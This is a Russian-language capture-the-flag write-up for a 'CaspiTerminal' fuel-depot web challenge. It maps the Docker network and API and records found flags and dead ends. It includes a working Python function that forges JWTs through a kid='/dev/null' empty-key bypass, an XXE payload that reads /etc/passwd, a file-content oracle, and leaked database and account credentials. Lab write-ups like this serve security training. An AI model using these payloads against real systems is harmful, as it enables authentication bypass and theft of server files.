# CaspiTerminal — KazHackStan CTF Writeup

**Цель:** 192.168.242.102:8007 — CaspiTerminal (Fuel Storage & Distribution)
**Стек:** Flask 3.0.3 / Python 3.11 / gunicorn 22.0.0 / lxml 5.2.2 / PostgreSQL / nginx / Docker
**Контейнер:** 172.18.0.5, Docker overlay FS, AppArmor docker-default, runs as ROOT (UID 0)

---

## Найденные флаги

| Флаг | Файл | Метод |
|------|------|-------|
| `STF{c8142af02727b3d7d51e4aece866104b}` | `/var/local/xxe/flag.txt` | XXE file read |
| `KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}` | `/var/local/lfi/flag.txt` | XXE file read |

---

## Архитектура

```
Kali (VPN) → 192.168.242.102:8007 → nginx (172.18.0.7)
                                      ↓
                                   terminal-web (172.18.0.5, Flask, port 3000)
                                      ↓                ↓
                              terminal-db (172.18.0.3)  gauge-gw.internal (172.18.0.4:9100)
                              PostgreSQL:5432

Неизвестные хосты (ARP active):
  172.18.0.2 — ?
  172.18.0.6 — ?
```

**Docker Compose проект:** `khs-oil-depot`
**Volumes:** `khs-oil-depot_lfiflagvol` → `/var/local/lfi` (RO), `khs-oil-depot_xxeflagvol` → `/var/local/xxe` (RO)

---

## Обнаруженные уязвимости

### 1. JWT Bypass (kid="/dev/null")

JWT подписывается HMAC-SHA256 с ключом из файла, указанного в `kid` заголовка. Если `kid="/dev/null"`, сервер читает `/dev/null` (0 байт) и использует пустой ключ. Можно подделать JWT с любой ролью:

```python
def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid}, separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400}, separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hmac.new(key, m.encode(), hashlib.sha256).digest())
```

### 2. XXE (Blind File Read)

Endpoint: `POST /api/ops/custody/ingest` (role: operator)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>
```

**Ограничения:**
- Файлы с `<`, `>`, `&`, null bytes — НЕ читаются (XML parse error → 400)
- HTTP entities отключены (`lxml no_network=True`)
- OOB XXE невозможен
- XInclude не обрабатывается
- Parameter entities не работают
- CDATA wrapping невозможен без parameter entities

### 3. Kid File Content Oracle

Подтверждено в round80: если `kid` указывает на файл, JWT подписывается содержимым этого файла. Если мы знаем содержимое — можем подписать валидный JWT:

```python
# Файлы добавляют \n в конце при чтении!
kid_oracle("/etc/hostname", b"5407f6317f5c\n")  # → 200 (match!)
kid_oracle("/app/db.py", db_content.encode() + b"\n")  # → 200 (match!)
```

Это позволяет верифицировать содержимое любого файла на сервере.

### 4. SSRF через Probe

Endpoint: `GET /api/ops/probe/sign?device=X` → `{url, sig}`
Endpoint: `POST /api/ops/probe` → `{body, status}`

Probe подписывает URL для 5 устройств с помощью `HMAC-SHA256(PROBE_SECRET, url)`:

| Device | URL | Данные |
|--------|-----|--------|
| lm-01 | gauge-gw.internal:9100/v1/meters/loading-arm-1/flow | flow_m3h, meter, totalizer_m3 |
| tk-01 | gauge-gw.internal:9100/v1/tanks/1/level | level_pct, tank, temperature_c, water_cm |
| tk-02 | gauge-gw.internal:9100/v1/tanks/2/level | то же |
| tk-03 | gauge-gw.internal:9100/v1/tanks/3/level | то же |
| tk-07 | gauge-gw.internal:9100/v1/tanks/7/level | то же |

**PROBE_SECRET неизвестен** — без него нельзя подписать произвольные URL для SSRF.

---

## Инфраструктура контейнера

### Читаемые файлы

| Файл | Размер | Содержимое |
|------|--------|------------|
| `/app/db.py` | 1173 B | Connection pool, DATABASE_URL = postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal |
| `/app/gunicorn.conf.py` | 373 B | bind 0.0.0.0:3000, gthread, 4 workers, 8 threads |
| `/app/requirements.txt` | 97 B | Flask 3.0.3, Werkzeug 3.0.3, gunicorn 22.0.0, psycopg2-binary 2.9.9, lxml 5.2.2, requests 2.32.3 |
| `/app/static/css/app.css` | 6841 B | CSS стили |
| `/app/templates/portal.html` | 104 B | extends base.html, block title/body |
| `/app/templates/services.html` | 98 B | extends base.html |
| `/app/templates/error.html` | 100 B | extends base.html, error code |
| `/etc/hostname` | 13 B | 5407f6317f5c |
| `/etc/hosts` | 127.0.0.1 localhost, 172.18.0.5 5407f6317f5c |
| `/etc/resolv.conf` | nameserver 127.0.0.11 (Docker DNS) |
| `/etc/passwd` | 18 стандартных пользователей Docker |

### Нечитаемые файлы (существуют, 400)

| Файл | Причина |
|------|---------|
| `/app/app.py` | Содержит `<` (Python код) |
| `/app/auth.py` | Содержит `<` |
| `/app/entrypoint.sh` | Содержит `&` или `>` |
| `/app/keys/carrier` | Бинарный ключ (JWT signing) |
| `/app/keys/operator` | Бинарный ключ |
| `/app/__pycache__/*.pyc` | Бинарные файлы |
| `/app/templates/base.html` | HTML с `<` |
| `/app/templates/index.html` | HTML |
| `/app/templates/login.html` | HTML |
| `/app/templates/register.html` | HTML |

### Несуществующие

- `/app/keys/probe` — НЕТ
- Все `/app/config.*`, `/app/.env*`, `/app/instance/*` — НЕТ
- Все `/var/local/probe/*`, `shell/*`, `llehs/*` — НЕТ
- Все log-файлы — НЕТ
- Все history-файлы — НЕТ
- Dockerfile, docker-compose.yml в контейнере — НЕТ

---

## API Endpoints (полный список)

| Method | Path | Описание |
|--------|------|----------|
| POST | `/api/auth/register` | Регистрация (email, password, company) |
| POST | `/api/auth/login` | Логин → session JWT cookie |
| POST | `/api/auth/logout` | Выход |
| GET | `/api/auth/me` | Данные из JWT |
| GET | `/api/ops/probe/sign?device=X` | Подписать URL для device |
| POST | `/api/ops/probe` | SSRF с подписанным URL |
| POST | `/api/ops/custody/ingest` | XML parser (XXE-уязвим) |
| GET | `/portal` | Partner Portal (показывает loading orders по sub) |
| GET | `/services` | Информационная страница |
| GET | `/login` | Страница входа |
| GET | `/register` | Страница регистрации |
| GET | `/healthz` | Health check |

Порты 9000-9003: только `/healthz` → 200 "ok"

---

## Зарегистрированный аккаунт

```
email: ctf_fubznz@caspiterminal.kz
password: Ctffubznz2026!
company: CTF_Team_fubznz
role: carrier
sub: 6077
```

---

## Portal — Loading Orders (из БД)

Loading orders привязаны к `sub` (user ID), НЕ к company:

| sub | Reference | Product | Volume | Tank | Window | Status |
|-----|-----------|---------|--------|------|--------|--------|
| 1 | LO-2026-0412 | Diesel (EN 590) | 32.00 m³ | T-01 | 2026-09-25 01:00 | scheduled |
| 1 | LO-2026-0413 | Gasoline AI-92 | 28.00 m³ | T-03 | 2026-09-25 04:30 | scheduled |
| 2 | LO-2026-0418 | Jet A-1 | 40.00 m³ | T-06 | 2026-09-25 06:00 | confirmed |
| 2 | LO-2026-0425 | Gasoline AI-95 | 30.00 m³ | T-04 | 2026-09-26 09:00 | scheduled |
| 3 | LO-2026-0421 | Fuel Oil M-100 | 54.00 m³ | T-07 | 2026-09-26 02:15 | scheduled |

Users 4-20, 50-10000: пустые порталы.

---

## Тупики (полный список)

### Атаки на XXE
- HTTP SSRF (lxml no_network=True)
- OOB XXE (no_network блокирует)
- CDATA wrapping (parameter entities не работают)
- Error-based XXE (generic error handler)
- Local DTD XXE
- XInclude (app не вызывает xinclude())
- UTF-7, ISO-8859-1 encoding
- php://filter (не PHP)

### SQL Injection
- Login, register (параметризованные запросы)
- JWT company в портале (параметризованные)
- JWT sub в портале (конвертируется в int, строки → 500)
- Probe/sign device (dict lookup, не SQL)
- Custody ingest fields (не идут в SQL)

### SSTI
- Все контексты (Jinja2 autoescaping)
- JWT company, carrier, reference

### JWT
- alg=none (rejected)
- HS384/HS512 (not accepted)
- kid command injection (app uses open(), not shell)
- kid path traversal to /proc/self/environ (null bytes → 400)

### Probe bypass
- sig=null/empty/0/false/[]/{}/ → 403
- sig=true/1 → 500
- URL manipulation (query params, fragments, case, encoding) → 403
- Extra JSON params (method, headers, data, body) → ignored

### Прочее
- Portal role escalation (все роли — одинаковый контент)
- Path traversal in static files (nginx блокирует)
- Flask debug/Werkzeug console (disabled)
- HTTP TRACE (405)
- /proc/self/fd/* (pipes/sockets, crash)
- /proc/self/environ (null bytes → 400)
- SSH на 192.168.242.102:22 (OpenSSH 10.2p1)

---

## Нерешённые задачи

### PROBE_SECRET (LLEHS challenge, 9000 pts)

PROBE_SECRET — ключ HMAC-SHA256 для подписи probe URL. Хранится предположительно в `/app/app.py` (нечитаем через XXE). Без него невозможен произвольный SSRF через probe.

**Что пробовали:**
- 200+ кандидатов (тематические слова, инфра-значения, хэши флагов, DB creds, hostname)
- Kid oracle: 30+ кандидатов для carrier key (не найден)
- Содержимое известных файлов как HMAC ключ (нет совпадения)
- Brute-force отклонён пользователем

**Оставшиеся векторы:**
- Извлечение carrier key через kid oracle (byte-by-byte — долго, но возможно)
- Hashcat/John для JWT cracking (JWT: `eyJhbGciOiJIUzI1NiIs...8nBoF23TaW2jXaeo22fJ6ODwO3yXSSUE7LFbzdHEHJk`)
- Неизвестные хосты 172.18.0.2 и 172.18.0.6
- Возможная связь с Nomad Stronghold (Military Base) — "танки" gauge-gw = военная техника?

### Связь с Nomad Stronghold (9500 pts)

Описание таска: "Министерство обороны... проверки количества техники... камеры... сети 7G. Угнать танк."

Гипотеза: gauge-gw отслеживает "танки" (tk-01..tk-07). "Угнать танк" = модифицировать данные gauge-gw через SSRF. Требует PROBE_SECRET для подписи произвольных URL.

Сетевой скан 192.168.242.0/24: других хостов не найдено (только .102).
